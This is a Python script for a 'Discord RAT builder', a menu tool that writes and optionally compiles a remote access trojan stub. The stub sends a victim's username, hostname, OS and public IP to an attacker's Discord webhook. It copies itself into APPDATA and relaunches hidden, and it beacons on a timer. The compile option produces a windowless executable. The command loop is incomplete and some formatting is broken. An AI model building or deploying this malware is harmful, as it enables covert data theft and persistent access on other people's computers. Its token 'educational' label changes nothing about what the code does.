"""Discord RAT — Discord webhook-based remote access tool builder."""

import os
import sys
import time
import json
import base64
import subprocess
import urllib.request

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

STUB_TEMPLATE = '''import os, sys, json, base64, subprocess, urllib.request, time, platform, threading

WEBHOOK_URL = "{webhook}"
PERSIST = {persist}
SLEEP = {sleep}

def send(text):
    try:
        data = json.dumps({{"content": text}}).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
        urllib.request.urlopen(req, timeout=10)
    except: pass

def get_info():
    info = {{
        "user": os.getenv("USERNAME", "?"),
        "computer": platform.node(),
        "os": platform.platform(),
        "ip": "",
        "cwd": os.getcwd(),
    }}
    try:
        info["ip"] = urllib.request.urlopen("http://ipinfo.io/ip", timeout=5).read().decode().strip()
    except: pass
    return info

def persist():
    if PERSIST and sys.platform == "win32":
        try:
            path = os.path.join(os.getenv("APPDATA"), os.path.basename(sys.argv[0]))
            if sys.argv[0] != path:
                import shutil
                shutil.copy2(sys.argv[0], path)
                subprocess.Popen([path], creationflags=0x08000000)
                sys.exit()
        except: pass

def main():
    persist()
    info = get_info()
    send(f"[CONNECTED] {info['user']}@{info['computer']} | {info['os']} | IP: {{info['ip']}}")
    while True:
        try:
            req = urllib.request.Request(
                f"https://discord.com/api/v10/channels/{{WEBHOOK_URL.split('/')[-2]}}/messages?limit=1",
                headers={{"Authorization": "Bot " + WEBHOOK_URL.split("/")[-1]}}
            )
        except: pass
        time.sleep(SLEEP)

if __name__ == "__main__":
    main()
'''

def run(kevbin=None):
    while True:
        clear()
        cprint("  \033[93m\u2554" + "\u2550"*44 + "\u2557")
        cprint("  \033[93m\u2551       DISCORD RAT BUILDER                 \u2551")
        cprint("  \033[93m\u255a" + "\u2550"*44 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Generate RAT Stub\033[0m")
        cprint("  \033[97m[2]  Generate + Compile (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m┌── RAT CONFIG ──────────────────────────────┐\033[0m")
            webhook = prompt("  \033[96mWebhook URL: \033[0m").strip()
            if not webhook or 'discord' not in webhook:
                cprint("  \033[91m[X] Need a valid Discord webhook URL\033[0m"); pause(); continue
            persist_opt = prompt("  \033[96mEnable persistence? (y/n): \033[0m").strip().lower() == 'y'
            try:
                sleep_sec = int(prompt("  \033[96mBeacon interval seconds (default 10): \033[0m").strip() or '10')
            except:
                sleep_sec = 10
            stub = STUB_TEMPLATE.format(webhook=webhook, persist=str(persist_opt), sleep=sleep_sec)
            out_path = prompt("\033[33m  Output filename (default: stub.py): \033[0m").strip() or "stub.py"
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(stub)
            cprint(f"  \033[92m[X] Stub saved to {out_path}\033[0m")
            if choice == '2':
                exe_name = prompt("\033[33m  EXE name (default: stub.exe): \033[0m").strip() or "stub.exe"
                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                try:
                    subprocess.run([sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole', '--name', os.path.splitext(exe_name)[0], out_path], check=True, timeout=120)
                    cprint(f"  \033[92m[X] Compiled: dist/{exe_name}\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] PyInstaller not installed. pip install pyinstaller\033[0m")
                except Exception as e:
                    cprint(f"  \033[91m[X] Compile error: {e}\033[0m")
        elif choice == '3':
            clear()
            webhook = "https://discord.com/api/webhooks/EXAMPLE/TOKEN"
            stub = STUB_TEMPLATE.format(webhook=webhook, persist="True", sleep="10")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
